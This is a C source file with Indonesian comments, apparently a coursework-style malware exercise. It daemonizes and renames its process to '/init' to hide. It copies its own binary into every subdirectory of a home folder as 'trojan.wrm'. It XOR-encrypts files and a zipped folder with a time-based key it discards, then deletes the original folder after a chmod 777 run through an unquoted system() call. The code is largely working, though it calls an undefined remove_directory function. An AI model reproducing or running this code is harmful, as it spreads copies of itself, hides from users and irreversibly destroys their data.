#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <errno.h>

// --- BAGIAN A --- Daemon yang menyembunyikan diri dan mengganti nama menjadi /init
void create_daemon() {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);  
    if (pid > 0) exit(EXIT_SUCCESS); 
    
    umask(0);  
    
    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);  
    
    if ((chdir("/")) < 0) exit(EXIT_FAILURE);  

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);
}

// --- BAGIAN B --- Enkripsi dengan metode XOR
void xor_encrypt(const char *filename, unsigned char key) {
    FILE *file = fopen(filename, "rb+");
    if (!file) {
        perror("Gagal membuka file");
        return;
    }

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *buffer = (char *)malloc(filesize);
    if (!buffer) {
        perror("Alokasi memori gagal");
        fclose(file);
        return;
    }

    fread(buffer, 1, filesize, file);
    fseek(file, 0, SEEK_SET);

    for (long i = 0; i < filesize; ++i) {
        buffer[i] ^= key;
    }

    fwrite(buffer, 1, filesize, file);
    fclose(file);
    free(buffer);
}


// --- BAGIAN C --- 
// Fungsi untuk menyalin malware ke direktori target
void trojan(const char *direktoriTarget, const char *lokasiMalware) {
    DIR *dir = opendir(direktoriTarget);
    if (!dir) return;

    struct dirent *entri;
    char path[1024];

    // Iterasi setiap file/direktori di direktori target
    while ((entri = readdir(dir)) != NULL) {
        if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", direktoriTarget, entri->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            trojan(path, lokasiMalware);  
        }
    }

    // Menyalin malware ke dalam direktori yang ditemukan
    char pathTujuan[1024];
    snprintf(pathTujuan, sizeof(pathTujuan), "%s/trojan.wrm", direktoriTarget);

    FILE *src = fopen(lokasiMalware, "rb");
    FILE *dst = fopen(pathTujuan, "wb");
    if (src && dst) {
        char buf[4096];
        size_t jumlah;
        while ((jumlah = fread(buf, 1, sizeof(buf), src)) > 0) {
            fwrite(buf, 1, jumlah, dst);
        }
    }
    if (src) fclose(src);
    if (dst) fclose(dst);

    closedir(dir);
}

// Fungsi untuk membuat ZIP dari folder
void zip_folder(const char *folder_name, const char *zip_filename) {
    pid_t pid = fork();
    if (pid == 0) {
        char *args[] = {"/usr/bin/zip", "-r", (char *)zip_filename, (char *)folder_name, NULL};
        execv(args[0], args);
        perror("Gagal membuat ZIP");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        wait(NULL);
    } else {
        perror("Fork gagal");
        exit(EXIT_FAILURE);
    }
}

void change_permissions(const char *path) {
    char command[256];
    snprintf(command, sizeof(command), "chmod -R 777 %s", path);
    int ret = system(command);
    if (ret == 0) {
        printf("Hak akses folder '%s' diubah menjadi 777.\n", path);
    } else {
        perror("Gagal mengubah hak akses");
    }
}


int main(int argc, char **argv) {
    const char *lokasiMalware = "/home/dinda/malware/executable";  // Path ke file malware
    const char *folderTarget = "/home/dinda";  

    create_daemon();

    char lokasiProgram[1024];
    ssize_t panjang = readlink("/proc/self/exe", lokasiProgram, sizeof(lokasiProgram) - 1);
    if (panjang != -1) {
        lokasiProgram[panjang] = '\0';
        trojan(folderTarget, lokasiProgram);
    } else {
        fprintf(stderr, "Gagal mendapatkan path executable.\n");
        return 1;
    }

    time_t t = time(NULL);
    unsigned char key = (unsigned char)(t % 256);

    // Enkripsi file randomfile
    const char *file_to_encrypt = "randomfile";
    xor_encrypt(file_to_encrypt, key);
    printf("File '%s' berhasil dienkripsi.\n", file_to_encrypt);

    // Zip dan enkripsi folder test
    const char *folder_to_zip = "test";
    const char *zip_filename = "test.zip";

    zip_folder(folder_to_zip, zip_filename);
    printf("Folder '%s' berhasil di-zip menjadi '%s'.\n", folder_to_zip, zip_filename);

    // Enkripsi file ZIP
    xor_encrypt(zip_filename, key);
    printf("File ZIP '%s' berhasil dienkripsi.\n", zip_filename);

    // Ubah hak akses folder sebelum menghapus
    change_permissions(folder_to_zip);

    // Hapus folder asli
    remove_directory(folder_to_zip);

    return 0;
}
